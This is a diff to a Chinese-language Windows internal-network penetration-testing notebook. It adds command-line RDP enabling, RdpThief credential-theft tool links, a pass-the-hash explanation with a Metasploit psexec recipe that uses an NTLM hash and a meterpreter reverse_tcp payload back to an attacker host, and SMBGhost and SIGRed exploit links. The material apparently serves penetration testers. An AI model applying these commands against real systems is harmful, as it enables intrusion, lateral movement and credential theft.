@@ -11,8 +11,10 @@
 # 大纲
 
 * **[RDP](#rdp)**
+    * [命令行开启RDP](#命令行开启rdp)
     * [多开](#多开)
     * [连接记录](#连接记录)
+    * [凭据窃取](#凭据窃取)
 
 * **[认证](#认证)**
     * [本地](#本地)
@@ -41,6 +43,14 @@
 ---
 
 # RDP
+
+**第三方连接工具**
+- [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
+    - kali 自带,使用方法 : `rdesktop <ip>`
+- [Remmina](https://remmina.org/)
+- [FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)
+
+## 命令行开启RDP
 
 **查看 3389 端口是否开启**
 ```
@@ -105,7 +115,7 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
         REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制
         ```
 
-    - **允许3389端口**
+    - **允许 3389 端口**
         ```
         netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
         ```
@@ -115,12 +125,6 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
         ```
         REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f
         ```
-
-**第三方连接工具**
-- [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
-    - kali 自带,使用方法 : `rdesktop <ip>`
-- [Remmina](https://remmina.org/)
-- [FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)
 
 ---
 
@@ -158,7 +162,15 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)
 
 **相关工具**
-- [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)
+- [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History) - 使用 powershell 列出已登录用户或所有用户的 RDP 连接历史记录
+
+---
+
+## 凭据窃取
+
+**相关工具**
+- [hmoytx/RdpThief_tools](https://github.com/hmoytx/RdpThief_tools) - 窃取 mstsc 中的用户明文凭据
+- [0x09AL/RdpThief](https://github.com/0x09AL/RdpThief)
 
 ---
 
@@ -466,7 +478,7 @@ Get-DecryptedCpassword "9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"
 
 path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常用的攻击方式。
 
-在内网中，获取不到明文密码，且破解不了 hash 又想扩大战果时，可以使用 hash 传递，扩展权限。
+利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用 NTLM 认证的一种缺陷，利用用户的密码哈希值来进行 NTLM 认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器，扩展权限。
 
 **相关文章**
 - [hash传递攻击研究](http://sh1yan.top/2019/05/19/Hash-Passing-Attack-explore/)
@@ -474,7 +486,14 @@ path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常
 - [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)
 - [KB22871997是否真的能防御PTH攻击？](https://www.anquanke.com/post/id/193150)
 
-**必要条件**
+**攻击适用情况**
+- 在工作组环境中：
+    - Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
+    - Vista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非 administrator)也不能使用哈希传递攻击，会提示拒绝访问。
+- 在域环境中
+    - 只能是域管理员组内用户(可以是域管理员组内非 administrator 用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。
+
+**攻击必要条件**
 
 - 哈希传递需要被认证的主机能够访问到服务器
 - 哈希传递需要被传递认证的用户名
@@ -512,11 +531,16 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
         ```
 
 - **metasploit**
+
+    目标主机的 Vista 之后的机器，所以只能使用 administrator 用户进行攻击。
     ```bash
     use exploit/windows/smb/psexec # 或 use exploit/windows/smb/psexec_psh
     set rhosts <ip>
-    set smbuser <user>
+    set smbuser <user>          # 域中的 PTH 这里不需要写域前缀
     set smbpass <password>      # 例如: 00000000000000000000000000000000:c780c78872a102256e946b3ad238f661
+
+    set payload windows/meterpreter/reverse_tcp
+    set lhost <ip>
 
     # 工具的参数需要填写固定格式 LM hash:NT hash，可以将 LM hash 填 0(LM hash 可以为任意值)，即 00000000000000000000000000000000:NT hash。
     exploit
@@ -1015,7 +1039,7 @@ Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:
     use auxiliary/dos/http/ms15_034_ulonglongadd    # 进行 dos 攻击
     ```
 
-**MS17-010**
+**CVE-2017-0143 - CVE-2017-0148 && MS17-010**
 - MSF 模块
     ```bash
     # 发现,检测
@@ -1085,10 +1109,20 @@ Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:
 
 - POC | Payload | exp
     - [ollypwn/SMBGhost](https://github.com/ollypwn/SMBGhost)
-    - [chompie1337/SMBGhost_RCE_PoC](https://github.com/chompie1337/SMBGhost_RCE_PoC)
+    - [chompie1337/SMBGhost_RCE_PoC](https://github.com/chompie1337/SMBGhost_RCE_PoC) - 远程利用代码
+    - [eerykitty/CVE-2020-0796-PoC](https://github.com/eerykitty/CVE-2020-0796-PoC) - 蓝屏 POC
+    - [danigargu/CVE-2020-0796](https://github.com/danigargu/CVE-2020-0796) - 本地提权 POC
 
 - 修复工具
     - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796
+
+**CVE-2020-1350**
+- 相关文章
+    - [SIGRed - Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers](https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/)
+    - [CVE-2020-1350漏洞深入剖析](https://bbs.pediy.com/thread-260712.htm?from=groupmessage)
+
+- POC | Payload | exp
+    - [maxpl0it/CVE-2020-1350-DoS](https://github.com/maxpl0it/CVE-2020-1350-DoS)
 
 ---
 
